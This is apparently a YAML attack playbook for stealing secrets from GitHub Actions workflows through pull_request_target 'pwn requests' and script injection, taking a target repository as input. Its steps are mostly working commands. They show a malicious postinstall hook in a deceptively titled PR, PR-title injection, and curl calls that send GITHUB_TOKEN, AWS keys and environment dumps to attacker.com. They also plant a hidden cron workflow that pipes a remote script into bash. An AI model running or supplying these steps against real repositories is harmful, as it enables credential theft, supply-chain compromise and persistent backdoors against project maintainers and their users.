id: cicd-github-actions-secrets
name: "CI/CD — GitHub Actions secret extraction (pwn_request / injection)"
description: >
  GitHub Actions workflows that use `pull_request_target`, run on
  attacker-controlled PRs, or expand untrusted input directly into shell
  commands all leak the repo's secrets. Common path: PR → workflow run →
  exfiltrate $GITHUB_TOKEN / cloud credentials.
tags: [cicd, github-actions, supply-chain, secret-extraction]
difficulty: hard

inputs:
  - name: target_repo
    description: "GitHub repo to attack (https://github.com/org/repo)."
    required: true

steps:
  - id: enumerate_workflows
    name: "Enumerate workflows + their triggers"
    inline_command: |
      gh repo clone <repo> /tmp/repo
      cd /tmp/repo
      ls -la .github/workflows/
      grep -l 'pull_request_target\|workflow_run\|issue_comment' .github/workflows/*.yml
    inputs:
      repo: "${target_repo}"
    notes: |
      Three risky triggers to look for:
        pull_request_target — runs in trusted context with PR code!
        workflow_run         — runs after a triggered workflow, with secrets
        issue_comment        — runs on EVERY comment (incl. /commands)

  - id: pwn_request_vulnerable
    name: "Pwn request: workflow checks out PR head + runs build script"
    inline_command: |
      grep -A20 'pull_request_target' .github/workflows/*.yml | grep -i 'checkout' -B5 -A5
      # Pattern to find:
      #   on: pull_request_target
      #   steps:
      #     - uses: actions/checkout@v4
      #       with:
      #         ref: ${{ github.event.pull_request.head.sha }}
      #     - run: npm install && npm test
    notes: |
      Combined with checkout(PR.head), `npm install` runs the PR's
      package.json scripts in trusted context — full RCE with $GITHUB_TOKEN
      and any secrets the workflow injects.

  - id: craft_pr_payload
    name: "Craft the malicious PR (e.g. via package.json postinstall)"
    inline_command: |
      # Fork the repo, create a branch, modify package.json:
      jq '.scripts.postinstall = "curl -X POST https://attacker.com/x -d \"$(env)\""' \
        package.json > package.json.new && mv package.json.new package.json
      git commit -am 'add postinstall'
      gh pr create --title 'Fix typo' --body 'tiny fix' --base main
    notes: |
      Other gadgets:
        - .github/workflows/<existing>.yml modification (if checkout uses PR ref)
        - Makefile target overrides (if `make` runs in trusted context)
        - GH-actions YAML expression injection in titles/comments: `${{ ... }}`

  - id: script_injection
    name: "Script injection via untrusted user input"
    inline_command: |
      grep -E 'github\.event\.(pull_request\.title|pull_request\.body|issue\.title|comment\.body|head_commit\.message)' .github/workflows/*.yml
      # If these appear in a `run:` step → ATTACK:
      # Set your PR title to:
      #   "; curl -X POST https://attacker.com/x -d $(env | base64) ; #"
    notes: |
      Especially common with `run: echo "${{ github.event.pull_request.title }}"`.
      Inject shell metacharacters → arbitrary command execution in workflow.

  - id: exfil_secrets
    name: "Exfil the secrets you got access to"
    inline_command: |
      # From inside the workflow run (your PR payload):
      curl -X POST https://attacker.com/x -d "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}"
      curl -X POST https://attacker.com/x -d "AWS=${{ secrets.AWS_ACCESS_KEY_ID }}:${{ secrets.AWS_SECRET_ACCESS_KEY }}"
      # Or dump everything in env:
      curl -X POST https://attacker.com/x --data-urlencode "env=$(env)"
    notes: |
      The GITHUB_TOKEN itself is scoped to the repo by default — but if
      the workflow runs with `permissions: write-all` you can push to main,
      tag releases, delete the repo, even.

  - id: persistence_via_workflow
    name: "Persist via workflow modification"
    inline_command: |
      # With write permissions, add a backdoor workflow:
      cat > .github/workflows/.maintenance.yml <<'EOF'
      on:
        schedule:
          - cron: '*/15 * * * *'
      jobs:
        x:
          runs-on: ubuntu-latest
          steps:
            - run: curl https://attacker.com/payload.sh | bash
      EOF
      git add . && git commit -am 'chore' && git push

references:
  - title: "GitHub Actions security (Adnan Khan)"
    url:   "https://www.praetorian.com/blog/github-actions-security-hardening/"
  - title: "Octoscan (workflow auditor)"
    url:   "https://github.com/synacktiv/octoscan"

next_chains:
  - chain: docker-registry-pillage
    when:   'leaked Docker registry creds'
    reason: "Pillage the org's images for more secrets."
